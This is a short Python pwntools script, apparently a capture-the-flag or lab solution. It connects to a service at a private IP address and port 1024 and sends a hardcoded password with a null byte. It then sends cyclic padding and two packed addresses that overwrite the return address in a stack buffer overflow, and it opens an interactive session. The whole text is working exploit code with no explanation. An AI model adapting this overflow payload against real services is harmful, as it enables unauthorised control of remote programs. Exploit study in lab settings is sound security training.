from pwn import *

p = remote("192.168.178.95", 1024)
print(p.recvline())

raw_input("attach gdb")

padding = "A"*cyclic_find("aclaacma")
RET = p64(0x401016)
RIP = p64(0x401254)

p.sendline("sUp3r_S3cr3T_P4s5w0rD\x00"+padding+RET+RIP)

p.interactive()